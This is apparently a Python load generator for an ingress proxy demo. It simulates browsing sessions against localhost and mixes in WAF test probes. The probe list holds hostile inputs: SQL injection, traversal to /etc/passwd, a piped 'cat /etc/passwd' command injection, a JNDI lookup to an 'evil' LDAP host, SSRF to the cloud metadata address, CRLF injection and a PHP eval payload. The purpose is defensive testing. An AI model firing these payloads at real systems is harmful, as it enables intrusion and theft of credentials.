#!/usr/bin/env python3
"""
Continuous HTTP traffic against ingress (admin-console demo).

Default mode simulates independent virtual users: idle gaps, browsing sessions,
page-load bursts (HTML + assets), and occasional WAF probes — not a flat RPS.

Usage (from repo root, ingress on :8080):

  go run ./cmd/ingress run -c examples/admin-console/ingress.yaml
  python3 examples/admin-console/scripts/live_traffic.py
  python3 examples/admin-console/scripts/live_traffic.py --users 40 --rps 25
  python3 examples/admin-console/scripts/live_traffic.py --mode steady --rps 20

Press Ctrl+C to stop; stats print on exit.
"""

from __future__ import annotations

import argparse
import http.client
import math
import random
import signal
import ssl
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import Iterable
from urllib.parse import urlparse

GLOBAL_IPS = [
    "8.8.8.8",
    "4.2.2.4",
    "1.1.1.1",
    "114.114.114.114",
    "223.5.5.5",
    "202.12.27.33",
    "9.9.9.9",
    "80.67.169.12",
    "77.88.8.8",
    "200.160.2.3",
    "165.21.83.88",
    "1.0.0.1",
    "185.228.168.9",
    "203.0.113.44",
    "198.51.100.8",
    "192.0.2.17",
    "103.86.96.100",
    "41.203.140.0",
    "196.216.2.1",
    "190.216.34.65",
]

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile",
    "curl/8.6.0",
    "Go-http-client/1.1",
    "kube-probe/1.29",
    "PostmanRuntime/7.39.0",
    "ingress-live-traffic/1.0",
]

REFERERS = [
    "-",
    "https://portal.example.com/dashboard",
    "https://www.google.com/",
    "https://cn.bing.com/search?q=ingress",
    "https://github.com/go-zoox/ingress",
]


@dataclass(frozen=True)
class Target:
    scheme: str
    host: str
    port: int
    tls: bool

    @property
    def display(self) -> str:
        return f"{self.scheme}://{self.host}:{self.port}"


@dataclass(frozen=True)
class RequestSpec:
    host: str
    path: str
    query: str = ""
    method: str = "GET"
    ua: str | None = None
    label: str = "normal"
    weight: float = 1.0


@dataclass(frozen=True)
class SessionStep:
    """One page view: burst of parallel-ish requests, then think time."""

    specs: tuple[RequestSpec, ...]
    think: tuple[float, float] = (0.8, 3.5)


@dataclass(frozen=True)
class UserJourney:
    name: str
    weight: float
    steps: tuple[SessionStep, ...]
    idle: tuple[float, float] = (8.0, 90.0)


def parse_target(base: str) -> Target:
    u = urlparse(base.strip())
    scheme = (u.scheme or "http").lower()
    host = u.hostname or "127.0.0.1"
    if u.port is not None:
        port = u.port
    elif scheme == "https":
        port = 443
    else:
        port = 80
    return Target(scheme=scheme, host=host, port=port, tls=scheme == "https")


def request_path(spec: RequestSpec) -> str:
    path = spec.path if spec.path.startswith("/") else "/" + spec.path
    if spec.query:
        return f"{path}?{spec.query}"
    return path


def normal_specs() -> list[RequestSpec]:
    """Mostly 2xx/3xx; small 4xx/403/500 via dedicated paths."""
    return [
        RequestSpec("admin.internal", "/", label="200:handler", weight=3.0),
        RequestSpec("admin.internal", "/healthz", label="200:health", weight=3.5),
        RequestSpec("api.example.com", "/v2/users", label="200:api-v2", weight=4.0),
        RequestSpec("api.example.com", "/v2/health", label="200:api-v2", weight=3.0),
        RequestSpec("api.example.com", "/public", label="200:api-public", weight=3.5),
        RequestSpec("api.example.com", "/public/docs", label="200:api-public", weight=2.5),
        RequestSpec("api.example.com", "/search", "q=ingress", label="200:api-search", weight=2.0),
        RequestSpec("api.example.com", "/search", "q=api+gateway", label="200:api-search", weight=1.5),
        RequestSpec("cdn.example.com", "/assets/app.js", label="200:cdn", weight=2.5),
        RequestSpec("cdn.example.com", "/assets/style.css", label="200:cdn", weight=2.0),
        RequestSpec("assets.cdn.example.com", "/static/main.js", label="200:cdn-assets", weight=1.5),
        RequestSpec("portal.example.com", "/", label="200:portal", weight=2.0),
        RequestSpec("legacy.example.com", "/", label="301:redirect", weight=1.2),
        RequestSpec("legacy.example.com", "/old/docs", label="301:redirect", weight=0.8),
        RequestSpec("httpbin.work", "/get", label="200:external", weight=0.6),
        RequestSpec("cdn.example.com", "/assets/app.js", label="200:cdn-cache", weight=1.8),
        RequestSpec("api.example.com", "/public", label="200:api-cache", weight=1.8),
        RequestSpec("admin.internal", "/missing-page", label="404", weight=0.35),
        RequestSpec("api.example.com", "/error/400", label="400", weight=0.25),
        RequestSpec("api.example.com", "/error/403", label="403", weight=0.20),
        RequestSpec("api.example.com", "/error/500", label="500", weight=0.20),
    ]


def attack_specs() -> list[RequestSpec]:
    hosts = ["api.example.com", "admin.internal", "portal.example.com", "cdn.example.com"]
    h = lambda i: hosts[i % len(hosts)]
    return [
        RequestSpec(h(0), "/search", "q=1'+OR+'1'='1", label="waf:sqli"),
        RequestSpec(h(1), "/static/../../etc/passwd", label="waf:traversal"),
        RequestSpec(h(2), "/.env", label="waf:sensitive"),
        RequestSpec(h(3), "/wp-admin/login.php", label="waf:sensitive"),
        RequestSpec(h(0), "/p", "q=<script>alert(1)", label="waf:xss"),
        RequestSpec(h(1), "/run", "cmd=|cat+/etc/passwd", label="waf:rce"),
        RequestSpec(h(2), "/api", "q=${jndi:ldap://evil/a}", label="waf:jndi"),
        RequestSpec(h(3), "/fetch", "url=http://169.254.169.254/latest/meta-data/", label="waf:ssrf"),
        RequestSpec(h(0), "/redir", "next=foo%0d%0aSet-Cookie:+x=y", label="waf:crlf"),
        RequestSpec(h(1), "/upload", "code=eval($_POST[0])", label="waf:php"),
        RequestSpec(h(2), "/", ua="sqlmap/1.7.2#stable", label="waf:scanner"),
        RequestSpec(h(3), "/", ua="Nikto/2.5.0", label="waf:scanner"),
    ]


def user_journeys() -> list[UserJourney]:
    """Browsing patterns: bursts within a step, pauses between steps and sessions."""
    return [
        UserJourney(
            "portal_reader",
            3.0,
            (
                SessionStep((RequestSpec("portal.example.com", "/", label="200:portal"),), (1.0, 4.0)),
                SessionStep(
                    (
                        RequestSpec("api.example.com", "/public", label="200:api-public"),
                        RequestSpec("cdn.example.com", "/assets/app.js", label="200:cdn"),
                        RequestSpec("cdn.example.com", "/assets/style.css", label="200:cdn"),
                    ),
                    (0.6, 2.5),
                ),
                SessionStep(
                    (RequestSpec("api.example.com", "/search", "q=ingress", label="200:api-search"),),
                    (2.0, 8.0),
                ),
            ),
            idle=(12.0, 120.0),
        ),
        UserJourney(
            "api_client",
            2.5,
            (
                SessionStep((RequestSpec("api.example.com", "/v2/health", label="200:api-v2"),), (0.3, 1.2)),
                SessionStep(
                    (
                        RequestSpec("api.example.com", "/v2/users", label="200:api-v2"),
                        RequestSpec("api.example.com", "/public/docs", label="200:api-public"),
                    ),
                    (1.0, 3.0),
                ),
                SessionStep(
                    (RequestSpec("api.example.com", "/search", "q=api+gateway", label="200:api-search"),),
                    (1.5, 5.0),
                ),
            ),
            idle=(6.0, 45.0),
        ),
        UserJourney(
            "cdn_heavy",
            2.0,
            (
                SessionStep(
                    (
                        RequestSpec("cdn.example.com", "/assets/app.js", label="200:cdn-cache"),
                        RequestSpec("cdn.example.com", "/assets/style.css", label="200:cdn-cache"),
                        RequestSpec("assets.cdn.example.com", "/static/main.js", label="200:cdn-assets"),
                    ),
                    (0.2, 1.0),
                ),
                SessionStep(
                    (
                        RequestSpec("cdn.example.com", "/assets/app.js", label="200:cdn-cache"),
                        RequestSpec("api.example.com", "/public", label="200:api-cache"),
                    ),
                    (0.5, 2.0),
                ),
            ),
            idle=(4.0, 30.0),
        ),
        UserJourney(
            "ops_check",
            1.2,
            (
                SessionStep(
                    (
                        RequestSpec("admin.internal", "/healthz", label="200:health"),
                        RequestSpec("admin.internal", "/", label="200:handler"),
                    ),
                    (0.5, 2.0),
                ),
            ),
            idle=(20.0, 180.0),
        ),
        UserJourney(
            "legacy_redirect",
            0.8,
            (
                SessionStep((RequestSpec("legacy.example.com", "/", label="301:redirect"),), (0.5, 2.0)),
                SessionStep((RequestSpec("legacy.example.com", "/old/docs", label="301:redirect"),), (1.0, 4.0)),
            ),
            idle=(15.0, 90.0),
        ),
        UserJourney(
            "curious_errors",
            0.6,
            (
                SessionStep((RequestSpec("api.example.com", "/public", label="200:api-public"),), (0.8, 2.0)),
                SessionStep(
                    (
                        RequestSpec("admin.internal", "/missing-page", label="404"),
                        RequestSpec("api.example.com", "/error/400", label="400"),
                    ),
                    (1.0, 3.0),
                ),
                SessionStep((RequestSpec("api.example.com", "/error/500", label="500"),), (2.0, 6.0)),
            ),
            idle=(25.0, 150.0),
        ),
        UserJourney(
            "scanner",
            0.35,
            (
                SessionStep((RequestSpec("api.example.com", "/search", "q=1'+OR+'1'='1", label="waf:sqli"),), (0.2, 0.8)),
                SessionStep((RequestSpec("admin.internal", "/static/../../etc/passwd", label="waf:traversal"),), (0.3, 1.0)),
                SessionStep((RequestSpec("portal.example.com", "/.env", label="waf:sensitive"),), (0.5, 1.5)),
            ),
            idle=(30.0, 240.0),
        ),
    ]


class Stats:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.total = 0
        self.errors = 0
        self.by_label: dict[str, int] = {}
        self.by_status: dict[int, int] = {}
        self.window_started = time.monotonic()
        self.window_count = 0

    def record(self, label: str, status: int | None, err: bool) -> None:
        with self.lock:
            self.total += 1
            self.window_count += 1
            if err:
                self.errors += 1
            self.by_label[label] = self.by_label.get(label, 0) + 1
            if status is not None:
                self.by_status[status] = self.by_status.get(status, 0) + 1

    def drain_window_rps(self) -> float:
        with self.lock:
            elapsed = max(time.monotonic() - self.window_started, 0.001)
            rps = self.window_count / elapsed
            self.window_started = time.monotonic()
            self.window_count = 0
            return rps

    def summary(self) -> str:
        with self.lock:
            top_labels = sorted(self.by_label.items(), key=lambda x: -x[1])[:10]
            top_status = sorted(self.by_status.items(), key=lambda x: -x[1])
            lines = [
                f"requests={self.total} transport_errors={self.errors}",
                "status: " + ", ".join(f"{k}:{v}" for k, v in top_status),
                "labels: " + ", ".join(f"{k}:{v}" for k, v in top_labels),
            ]
            return "\n".join(lines)


def weighted_choice(specs: Iterable[RequestSpec]) -> RequestSpec:
    items = list(specs)
    weights = [s.weight for s in items]
    return random.choices(items, weights=weights, k=1)[0]


def weighted_journey(journeys: list[UserJourney]) -> UserJourney:
    return random.choices(journeys, weights=[j.weight for j in journeys], k=1)[0]


def do_request(
    target: Target,
    spec: RequestSpec,
    timeout: float,
    tls_ctx: ssl.SSLContext | None,
) -> tuple[int | None, bool]:
    ip = random.choice(GLOBAL_IPS)
    ua = spec.ua or random.choice(USER_AGENTS)
    headers = {
        "Host": spec.host,
        "User-Agent": ua,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Referer": random.choice(REFERERS),
        "Accept": "text/html,application/json,*/*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "zh-CN,zh;q=0.9", "ja-JP,ja;q=0.8"]),
        "Connection": "close",
    }
    conn: http.client.HTTPConnection
    if target.tls:
        conn = http.client.HTTPSConnection(
            target.host,
            target.port,
            timeout=timeout,
            context=tls_ctx,
        )
    else:
        conn = http.client.HTTPConnection(target.host, target.port, timeout=timeout)
    try:
        conn.request(spec.method, request_path(spec), headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp.read(256)
        return status, False
    except Exception:
        return None, True
    finally:
        conn.close()


def fire(
    target: Target,
    spec: RequestSpec,
    timeout: float,
    tls_ctx: ssl.SSLContext | None,
    stats: Stats,
) -> None:
    status, err = do_request(target, spec, timeout, tls_ctx)
    stats.record(spec.label, status, err)


def preflight(target: Target, timeout: float, tls_ctx: ssl.SSLContext | None) -> int:
    spec = RequestSpec("admin.internal", "/healthz", label="preflight")
    status, err = do_request(target, spec, timeout, tls_ctx)
    if err:
        print(
            f"ERROR: cannot reach ingress proxy at {target.display}\n"
            "  Start: go run ./cmd/ingress run -c examples/admin-console/ingress.yaml",
            file=sys.stderr,
        )
        return 1
    if status != 200:
        print(f"WARN: preflight -> HTTP {status} (expected 200)", file=sys.stderr)
    else:
        print(f"preflight OK: {target.display} Host:admin.internal /healthz -> 200", flush=True)
    return 0


def activity_multiplier(started: float) -> float:
    """Slow waves + jitter: traffic ebbs and flows like real usage."""
    t = time.monotonic() - started
    wave = 1.0 + 0.45 * math.sin(t / 73) + 0.25 * math.sin(t / 19)
    jitter = random.uniform(0.75, 1.35)
    return max(0.25, wave * jitter)


def pace_scale(target_rps: float, users: int) -> float:
    """Scale session timing so average throughput approximates --rps."""
    # Empirical: one virtual user at pace=1 yields ~0.092 req/s with default journeys.
    per_user_rps = 0.092
    estimated = max(users * per_user_rps, 0.001)
    return max(0.35, target_rps / estimated)


def wait_stop(stop: threading.Event, seconds: float) -> bool:
    if seconds <= 0:
        return stop.is_set()
    return stop.wait(seconds)


def run_user_session(
    user_id: int,
    target: Target,
    pool: ThreadPoolExecutor,
    journeys: list[UserJourney],
    attacks: list[RequestSpec],
    attack_ratio: float,
    timeout: float,
    tls_ctx: ssl.SSLContext | None,
    stats: Stats,
    stop: threading.Event,
    started: float,
    pace: float,
) -> None:
    # Stagger first visit so everyone does not hit at once.
    if wait_stop(stop, random.uniform(0.0, 2.5) / max(pace, 1.0) + user_id * 0.04 / max(pace, 1.0)):
        return

    while not stop.is_set():
        mult = activity_multiplier(started) * pace
        journey = weighted_journey(journeys)
        lo, hi = journey.idle
        idle = max(0.25, random.uniform(lo, hi) / mult)
        if wait_stop(stop, idle):
            break

        extra_steps = random.randint(0, 1)
        steps = list(journey.steps)
        if extra_steps and journey.name != "scanner":
            steps.append(
                SessionStep(
                    (weighted_choice(normal_specs()),),
                    (random.uniform(0.5, 2.0), random.uniform(2.0, 6.0)),
                )
            )

        for step in steps:
            if stop.is_set():
                break
            burst_gap = random.uniform(0.04, 0.22) / max(mult, 0.5)
            for spec in step.specs:
                if random.random() < attack_ratio and journey.name != "scanner":
                    spec = random.choice(attacks)
                pool.submit(fire, target, spec, timeout, tls_ctx, stats)
                if wait_stop(stop, burst_gap * random.uniform(0.6, 1.4)):
                    break
            think_lo, think_hi = step.think
            think = max(0.15, random.uniform(think_lo, think_hi) / max(mult * 0.85, 0.35))
            if wait_stop(stop, think):
                break


def run_steady(
    target: Target,
    pool: ThreadPoolExecutor,
    normal: list[RequestSpec],
    attacks: list[RequestSpec],
    attack_ratio: float,
    timeout: float,
    tls_ctx: ssl.SSLContext | None,
    stats: Stats,
    stop: threading.Event,
    interval: float,
    deadline: float | None,
) -> None:
    while not stop.is_set():
        if deadline is not None and time.monotonic() >= deadline:
            break
        spec = random.choice(attacks) if random.random() < attack_ratio else weighted_choice(normal)
        pool.submit(fire, target, spec, timeout, tls_ctx, stats)
        if wait_stop(stop, interval):
            break


def heartbeat(stats: Stats, stop: threading.Event, started: float) -> None:
    while not stop.wait(12.0):
        rps = stats.drain_window_rps()
        mult = activity_multiplier(started)
        print(f"  … instant ~{rps:.1f} req/s  activity×{mult:.2f}", flush=True)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Simulate live ingress traffic for admin overview demos.")
    p.add_argument("--base", default="http://127.0.0.1:8080", help="Ingress L7 HTTP base URL")
    p.add_argument(
        "--mode",
        choices=("users", "steady"),
        default="users",
        help="users = virtual sessions with bursts (default); steady = flat RPS",
    )
    p.add_argument("--users", type=int, default=25, help="Virtual users in users mode (default: 25)")
    p.add_argument(
        "--rps",
        type=float,
        default=20.0,
        help="Target average RPS (steady: exact; users: scales session pace, default: 20)",
    )
    p.add_argument("--workers", type=int, default=16, help="Concurrent request workers (default: 16)")
    p.add_argument("--duration", type=int, default=0, help="Stop after N seconds (0 = until Ctrl+C)")
    p.add_argument(
        "--attack-ratio",
        type=float,
        default=0.08,
        help="Fraction of WAF attack probes (default: 0.08)",
    )
    p.add_argument("--timeout", type=float, default=8.0, help="Per-request timeout seconds")
    p.add_argument("--insecure", action="store_true", help="Skip TLS verify when using https:// base")
    p.add_argument("--skip-check", action="store_true", help="Skip preflight connectivity check")
    p.add_argument("--seed", type=int, default=0, help="RNG seed (0 = random)")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    if args.seed:
        random.seed(args.seed)
    if args.rps <= 0:
        print("rps must be > 0", file=sys.stderr)
        return 2
    if args.users < 1:
        print("users must be >= 1", file=sys.stderr)
        return 2
    if not 0 <= args.attack_ratio <= 1:
        print("attack-ratio must be between 0 and 1", file=sys.stderr)
        return 2

    target = parse_target(args.base)
    tls_ctx: ssl.SSLContext | None = None
    if target.tls:
        tls_ctx = ssl.create_default_context()
        if args.insecure:
            tls_ctx.check_hostname = False
            tls_ctx.verify_mode = ssl.CERT_NONE

    if not args.skip_check:
        code = preflight(target, args.timeout, tls_ctx)
        if code != 0:
            return code

    stats = Stats()
    stop = threading.Event()

    def on_sig(*_: object) -> None:
        stop.set()

    signal.signal(signal.SIGINT, on_sig)
    signal.signal(signal.SIGTERM, on_sig)

    normal = normal_specs()
    attacks = attack_specs()
    journeys = user_journeys()
    started = time.monotonic()
    deadline = started + args.duration if args.duration > 0 else None
    pace = pace_scale(args.rps, args.users)

    if args.mode == "users":
        print(
            f"live_traffic -> {target.display}  mode=users  users={args.users}  "
            f"target_rps≈{args.rps}  workers={args.workers}  attack_ratio={args.attack_ratio:.0%}  "
            f"(Ctrl+C to stop)",
            flush=True,
        )
    else:
        print(
            f"live_traffic -> {target.display}  mode=steady  rps={args.rps}  workers={args.workers}  "
            f"attack_ratio={args.attack_ratio:.0%}  (Ctrl+C to stop)",
            flush=True,
        )

    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
        threads: list[threading.Thread] = []
        if args.mode == "users":
            hb = threading.Thread(target=heartbeat, args=(stats, stop, started), daemon=True)
            hb.start()
            for uid in range(args.users):
                t = threading.Thread(
                    target=run_user_session,
                    args=(
                        uid,
                        target,
                        pool,
                        journeys,
                        attacks,
                        args.attack_ratio,
                        args.timeout,
                        tls_ctx,
                        stats,
                        stop,
                        started,
                        pace,
                    ),
                    daemon=True,
                )
                t.start()
                threads.append(t)
            while not stop.is_set():
                if deadline is not None and time.monotonic() >= deadline:
                    stop.set()
                    break
                stop.wait(0.5)
        else:
            interval = 1.0 / args.rps
            steady = threading.Thread(
                target=run_steady,
                args=(
                    target,
                    pool,
                    normal,
                    attacks,
                    args.attack_ratio,
                    args.timeout,
                    tls_ctx,
                    stats,
                    stop,
                    interval,
                    deadline,
                ),
                daemon=True,
            )
            steady.start()
            threads.append(steady)
            while not stop.is_set():
                if deadline is not None and time.monotonic() >= deadline:
                    stop.set()
                    break
                stop.wait(0.5)

        stop.set()
        for t in threads:
            t.join(timeout=2.0)

    elapsed = max(time.monotonic() - started, 0.001)
    print(f"\nStopped after {elapsed:.1f}s  avg {stats.total / elapsed:.1f} req/s")
    print(stats.summary())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
